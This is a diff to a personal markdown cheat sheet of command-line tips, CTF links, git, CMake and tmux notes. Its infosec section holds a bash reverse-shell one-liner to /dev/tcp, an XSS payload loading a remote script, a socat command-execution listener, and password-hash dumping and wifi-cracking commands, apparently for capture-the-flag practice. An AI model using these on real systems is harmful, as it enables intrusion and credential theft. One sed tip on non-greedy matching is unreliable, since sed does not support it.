@@ -1,5 +1,6 @@
 ---
-title: Tips and tricks on computer
+title: The One Note
+subtitle: Tips and tricks on computer
 author: João Fukuda
 ---
 
@@ -22,6 +23,15 @@ Programs list:
 * convert
 * gnuplot
 
+## entr
+
+Checks for changes in files passed through stdin
+
+Run a command when a file changes:
+```bash
+ls src/* | entr <cmd> # No quotes needed
+```
+
 ## awk
 
 Work with tables and column outputs in Linux.
@@ -43,6 +53,22 @@ Count number of lines
 ```bash
 # First column equals '1' and second matches regex
 awk 'BEGIN { rows = 0 }$1 == 1 && $2 ~ /^c.*e$/ { rows += 1 } END {print rows}'
+```
+
+## openssl
+
+Sym key encrypt/decrypt file
+```bash
+# Encrypt
+openssl aes-256-cbc -salt -in file -out encfile
+
+# Decrypt
+openssl aes-256-cbc -d -in encfile -out file
+```
+
+Netcat through SSL
+```bash
+openssl s_client -connect address:port -nbio
 ```
 
 ## sed
@@ -78,13 +104,13 @@ sed -i 's/<pattern>/<subst>/'
 
 Use the matching group
 ```bash
-sed -E 's/(patt1) (patt2)/\2/' # replaces \2 with patt2's match
+sed -E 's/(patt1) (patt2)/\2/' # replaces \2 with `patt2`'s match
 ```
 
 Use non greedy match instead of getting the biggest possible match
 ```bash
-# ? before * or +
-sed -E 's/.*? (<pattern2>)//'
+# ? after * or +
+sed -E 's/.*?\s//'
 ```
 
 Ignore group matching for matches inside `()`
@@ -95,6 +121,8 @@ sed -E 's/(?:.*)//'
 
 ## paste
 
+Format lines of output
+
 Get lines from stdin and print delimited by comma
 ```bash
 paste -sd,
@@ -102,12 +130,14 @@ paste -sd,
 
 ## ffmpeg
 
-Get screenshot to `feh`
+Formats and converts raw video and image data
+
+Get photo from webcam to `feh`
 ```bash
 ffmpeg -i /dev/video0 -frames 1 -f image2 - | feh -
 ```
 
-Get video to `vlc`
+Get video from webcam to `vlc`
 ```bash
 ffmpeg -i /dev/video0 -f mpegts - | vlc -
 ```
@@ -140,16 +170,14 @@ plot-%.png: %.plt
 
 # InfoSec
 
-## Red Team
+## Links
 
-### Links
-
-#### Infos
+### Infos
 
 * [CTFTime](https://ctftime.org/)
 * [CTF101](https://ctf101.org/)
 
-#### Challenges
+### Challenges
 
 * [Crackmes.one](https://crackmes.one/)
 * [CryptoHack](https://cryptohack.org/)
@@ -171,9 +199,9 @@ plot-%.png: %.plt
 * [SmashTheStack](http://smashthestack.org/)
 * [TryHackMe](http://tryhackme.com/)
 
-### General
+## General
 
-#### Hash Cracking
+### Hash Cracking
 
 * [crackstation](https://crackstation.net/)
 * john
@@ -181,18 +209,16 @@ plot-%.png: %.plt
 * hashid
 * haiti
 
-### Web
+## Web
 
-#### Useful links
+* sublist3r
+
+### Links
 
 * [requestcatcher.com](https://requestcatcher.com/)
 * [requestbin.net](https://requestbin.net/)
 
-#### Useful Tools
-
-* sublist3r
-
-#### curl
+### curl
 
 Get verbose request
 ```bash
@@ -209,25 +235,25 @@ curl -d data url
 >
 > -d could be `cat file`
 
-#### wget
+### wget
 
 Crawler
 ```bash
 wget --spider -r -nv --level {0,N} -e robots=off url
 ```
 
-#### XSS
+### XSS
 
 14.rs
 ```html
 <script src="//14.rs"></script>
 ```
 
-### Binary Exploit
+## Binary Exploit
 
 * Ghidra
 
-#### Radare2
+### Radare2
 
 Enter with analysis on
 ```bash
@@ -236,17 +262,33 @@ r2 -AA <file>
 
 Visual mode
 ```
-# Enter Visual Mode
+# Enter Panel Mode
 > v<CR>
 
-# On Visual Mode
-<space>: Enter block mode
+# On Panel Mode
+<space>: Enter Graph Mode
+<enter>: Zoom current panel
 _: List/Goto symbols
+\: Possible commands (One useful option is in 'edit > asm.pseudo')
+!: Simple assembly visualization
+b: Browse stuff
+w: Window Mode
+
+# On Window Mode
+X: Close window
+
+# On Graph Mode
+q: Exit Graph Mode
+<space>: Exit Graph Mode
+_: List/Goto symbols
+-: Zoom Out
++: Zoom In
+0: Default Zoom
 ```
 
-### Forensics
+## Forensics
 
-#### Steganography
+### Steganography
 
 * exiftool
 * steghide - jpeg
@@ -254,14 +296,31 @@ _: List/Goto symbols
 * stegcracker
 * stegoveritas - auto image filtering
 
-#### Binwalk
+### XXD
 
-Extract all:
+Read file in binary:
 ```bash
-binwalk --dd='.*' file
+xxd file
 ```
 
-#### Volatility
+Revert from hexdump to a file:
+```bash
+xxd -r -p dump output_file
+```
+
+### Binwalk
+
+Extract:
+```bash
+binwalk -e file
+```
+
+Hard extract:
+```bash
+binwalk --dd='.*' -M file
+```
+
+### Volatility
 
 Memory dump tool
 
@@ -285,30 +344,33 @@ Hash dump
 volatility -f file --profile=<profile> hashdump
 ```
 
-### Networking
+## Networking
 
 * Nikto
 
-#### Rev Shell
+### Socat
+
+Run a command through a TCP connection:
+```bash
+socat tcp-listen:<port>,fork,reuseaddr 'exec:<cmd>'
+```
+
+### Rev Shell
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'
 ```
 
-For better performance, use `pwncat`
+For better performance, use `pwncat` to listen
 
-#### Wifi Cracking
-
-##### aircrack-ng suite
+### Aircrack-ng suite
 
 Crack wifi passwords from `.pcap` files
 ```bash
 aircrack-ng file wordlist
 ```
 
-#### Traffic Analysis
-
-##### tshark
+### tshark
 
 Filter outputs
 ```bash
@@ -337,6 +399,14 @@ tshark -r file -z "follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906"
 
 ## Versioning
 
+#### Lock files
+
+Locks dependency versions
+
+#### Vendering
+
+Put the dependencies **inside** your project and ship program with it
+
 ### Semantic version number
 
 ```
@@ -356,14 +426,6 @@ tshark -r file -z "follow,tcp,ascii,200.57.7.197:32891,200.57.7.198:2906"
 * Major:
 : Backwards **incompatible** change
 
-### Lock files
-
-Locks dependency versions
-
-#### Vendering
-
-Put the dependencies **inside** your project and ship program with it
-
 ## Testing
 
 #### Unit test
@@ -378,7 +440,182 @@ Test integration of multiple subsystem
 
 Test something that was broken before to prevent its reintroduction
 
-### Mocking
+#### Mocking
 
 Replace parts of code to simulate a simpler environment
+
+## git
+
+* folder
+: is a tree
+* file
+: is a blob
+
+```
+[S1]---[S2]---[S3]---[S5]
+          \          /
+           ---[S4]---
+```
+
+`[S5]` is a merge of both `[S3]` and `[S4]`
+
+All States have metadata such as author and message
+
+Beautiful `git log`
+```bash
+git log --all --graph --decorate --oneline
+```
+
+Check what **any** hash means
+```bash
+git cat-file -p <hash>
+```
+
+## CMake
+
+#### Directories
+
+Need to have a `CMakeLists.txt` file.
+
+They can be added with the CMake command `add_subdirectory()`.
+
+#### Scripts
+
+```bash
+cmake -p <script>.cmake
+```
+
+#### Modules
+
+`<script>.cmake` on `CMAKE_MODULE_PATH`
+
+Can be loaded with `include()`
+
+### Syntax
+
+#### Command
+
+```cmake
+command_name(space separated list of arguments)
+```
+
+It can:
+
+* set variables
+* change behavior of other commands
+
+### Variables
+
+Expand to an empty string when not set
+
+```cmake
+set(hello world)
+message(STATUS "Hello, ${hello}")
+```
+
+### Comments
+
+```cmake
+# Single line
+
+#[==[
+	Multi line comment
+	#[=[
+		These can be nested
+	#]=]
+#]==]
+```
+
+Inserting an additional `#` to the beginning of a multi-line comment disables that nest
+
+### Custom commands
+
+Added with `function()` or `macro()`
+
+Old definitions of commands can be accessed with a `_` prefix
+
+#### Example
+
+```cmake
+function(custom_cmd this that)
+	# ...
+	set(${this} ... PARENT_SCOPE) # global variable instead of local IF exists
+endfunction()
+custom_cmd(bana na)
+```
+
+There are these variables in custom_cmd scope: `this`, `that`, `ARGC`, `ARGV`, `ARGN`, `ARG0` and `ARG1`.
+
+### Targets
+
+#### Constructors
+
+* `add_executable()`
+* `add_library()`
+
+#### Member variables
+
+Target properties
+
+#### Member functions
+
+* `get_target_property()`
+* `set_target_property()`
+* `get_property(TARGET)`
+* `set_property(TARGET)`
+* `target_compile_definitions()`
+* `target_compile_features()`
+* `target_compile_options()`
+* `target_include_directories()`
+* `target_link_libraries()`
+* `target_sources()`
+
+Choose these instead of the ones above:
+
+* `add_compile_options()`
+* `include_directories()`
+* `link_directories()`
+* `link_libraries()`
+
+```cmake
+target_compile_features(Foo
+	PUBLIC
+		cxx_string_enums
+	PRIVATE
+		cxx_lambdas
+		cxx_range_for
+)
+```
+
+## Tmux
+
+#### Simple named session
+
+```bash
+tmux -s session_name
+```
+
+#### Shared session
+
+```bash
+tmux new -s alice
+```
+
+And
+
+```bash
+tmux a -t alice
+```
+
+#### Independent window sharing
+
+```bash
+tmux new -s alice
+```
+
+And
+
+```bash
+tmux new -s bob -t alice
+```
 
